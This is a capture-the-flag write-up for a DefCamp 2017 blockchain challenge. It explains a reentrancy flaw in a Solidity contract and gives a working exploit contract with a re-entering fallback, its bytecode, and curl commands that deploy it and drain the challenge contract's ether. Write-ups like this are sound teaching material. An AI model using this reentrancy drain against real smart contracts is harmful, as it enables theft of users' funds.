## Get Rich

### Description
There is a new successful ICO in the market but we've also saw they do not care about the investor's money security. Exploit this "victim" and get rich. 
API: https://blockchain.dctf-quals-17.def.camp
Sol: https://blockchain.dctf-quals-17.def.camp/DctfChall.sol 

*Update 11:00 EEST: Find a vulnerability in the smart contract, "get the victim" and exploit it using blockchain api available.*

### Author: 
Andrei

### Stats: 
387 points / 4 solvers

### Solution - Summary

This is a classic example of Reetrancy attack over Solidity Smart Contracts.
Looking at the solidity contract, you can see the line 62: msg.sender.call.value(amount)(). If it is returning ether to a payable smart contract, it will wait for the smart contract to finish executing the code in its fallback function before continuing, when it subtracts from the attacker's balance. You can find more explanation in [this writeup](https://ctftime.org/writeup/7692).

### Solution - Code
```
pragma solidity ^0.4.4;

import "../contracts/DctfChall.sol";

contract DctfExploit {

  DctfChall public dctf;
  address owner; 
  bool public performAttack = false;

  function DctfExploit(DctfChall addr, address _owner){
    owner = _owner;
    dctf = addr;
  }

  function attack()  {
    performAttack = true;
    dctf.invest.value(1)(this);
    dctf.withdraw(1);
  }

  function getBalance() returns (uint256) {
    return this.balance;
  }

  function getJackpot(){
    dctf.withdraw(dctf.balance);
    bool res = owner.send(this.balance);
    performAttack = true;
  }

  function() payable {
    if (performAttack) {
      performAttack = false;
      dctf.withdraw(1);
    }
  }
}
```

### Solution - How to exploit?
The following are just an example during testing, you can create your own.
Hacker Wallet: 0xca36231f73d8bfa31e1a6c18a8cdcaa90f4d5e32
DCTF Chall Contract: 0xa01e22fa9bd4869b51150d7ac8d0aae78679fad5
DCTF Exploit Contract: 0xa636bddb33abbf7095333f08315d36abd98811d5 

#### Step 1: Create Exploit Contract
```
curl -d "function=submit_contract&abi=[{\"constant\":false,\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getJackpot\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"performAttack\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"dctf\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"_owner\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]&evmCode=0x60606040526001805460a060020a60ff0219169055341561001f57600080fd5b6040516040806103f3833981016040528080519190602001805160018054600160a060020a03928316600160a060020a031991821617909155600080549590921694169390931790925550506103798061007a6000396000f300606060405236156100515763ffffffff60e060020a60003504166312065fe081146100e15780639329066c146101065780639e5faafc14610119578063baf755cb1461012c578063d1be56e614610153575b60015460a060020a900460ff16156100df576001805474ff000000000000000000000000000000000000000019168155600054600160a060020a031690632e1a7d4d9060405160e060020a63ffffffff84160281526004810191909152602401600060405180830381600087803b15156100ca57600080fd5b6102c65a03f115156100db57600080fd5b5050505b005b34156100ec57600080fd5b6100f4610182565b60405190815260200160405180910390f35b341561011157600080fd5b6100df610190565b341561012457600080fd5b6100df610243565b341561013757600080fd5b61013f61032e565b604051901515815260200160405180910390f35b341561015e57600080fd5b61016661033e565b604051600160a060020a03909116815260200160405180910390f35b600160a060020a0330163190565b60008054600160a060020a0316632e1a7d4d813160405160e060020a63ffffffff84160281526004810191909152602401600060405180830381600087803b15156101da57600080fd5b6102c65a03f115156101eb57600080fd5b5050600154600160a060020a03908116915030163180156108fc0290604051600060405180830381858888f150506001805474ff0000000000000000000000000000000000000000191660a060020a17905550505050565b6001805474ff0000000000000000000000000000000000000000191660a060020a178155600054600160a060020a0316906303f9c793903060405160e060020a63ffffffff8516028152600160a060020a0390911660048201526024016000604051808303818588803b15156102b857600080fd5b6125ee5a03f115156102c957600080fd5b5050600054600160a060020a03169150632e1a7d4d9050600160405160e060020a63ffffffff84160281526004810191909152602401600060405180830381600087803b151561031857600080fd5b6102c65a03f1151561032957600080fd5b505050565b60015460a060020a900460ff1681565b600054600160a060020a0316815600a165627a7a723058205ff756d01e4952d83625baaa4c7d64e55a0194d7cec66dacc4bc648dd300d3980029&from=0xca36231f73d8bfa31e1a6c18a8cdcaa90f4d5e32&password=testam&params=[\"0xa01e22fa9bd4869b51150d7ac8d0aae78679fad5\",\"0xca36231f73d8bfa31e1a6c18a8cdcaa90f4d5e32\"]&gas=2000000" -X POST https://blockchain.dctf-quals-17.def.camp/index.php
```

#### Step 2 - Send some money to the Exploit Wallet 
```
curl -d "function=send_money&from=0xca36231f73d8bfa31e1a6c18a8cdcaa90f4d5e32&password=testam&to=0xa636bddb33abbf7095333f08315d36abd98811d5&amount=0.0001" -X POST https://blockchain.dctf-quals-17.def.camp/index.php
```

```
curl -d "function=get_balance&wallet=0xa636bddb33abbf7095333f08315d36abd98811d5" -X POST https://blockchain.dctf-quals-17.def.camp/index.php
```

#### Step 3 - Start the Exploit.Attack()
```
curl -d "function=call_contract&abi=[{\"constant\":false,\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getJackpot\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"performAttack\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"dctf\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"_owner\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]&address=0xa636bddb33abbf7095333f08315d36abd98811d5&from=0xca36231f73d8bfa31e1a6c18a8cdcaa90f4d5e32&password=testam&func=attack&params=[]&value=&type=standard&gas=2000000" -X POST https://blockchain.dctf-quals-17.def.camp/index.php
```


#### Step 4 - Exploit.getJackpot()
```
curl -d "function=call_contract&abi=[{\"constant\":false,\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getJackpot\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"performAttack\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"dctf\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"_owner\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]&address=0xa636bddb33abbf7095333f08315d36abd98811d5&from=0xca36231f73d8bfa31e1a6c18a8cdcaa90f4d5e32&password=testam&func=getJackpot&params=[]&value=&type=standard&gas=2000000" -X POST https://blockchain.dctf-quals-17.def.camp/index.php
```

#### Step 5 - Verify Profits:

`curl -d "function=get_balance&wallet=0xca36231f73d8bfa31e1a6c18a8cdcaa90f4d5e32&in_ether=1" -X POST https://blockchain.dctf-quals-17.def.camp/index.php`
`curl -d "function=get_balance&wallet=0xa01e22fa9bd4869b51150d7ac8d0aae78679fad5&in_ether=1" -X POST https://blockchain.dctf-quals-17.def.camp/index.php`

#### Step 6 - Get Flag:
`curl -d "function=get_flag&target=0xa01e22fa9bd4869b51150d7ac8d0aae78679fad5&password=testam&attacker=0xca36231f73d8bfa31e1a6c18a8cdcaa90f4d5e32" -X POST https://blockchain.dctf-quals-17.def.camp/index.php`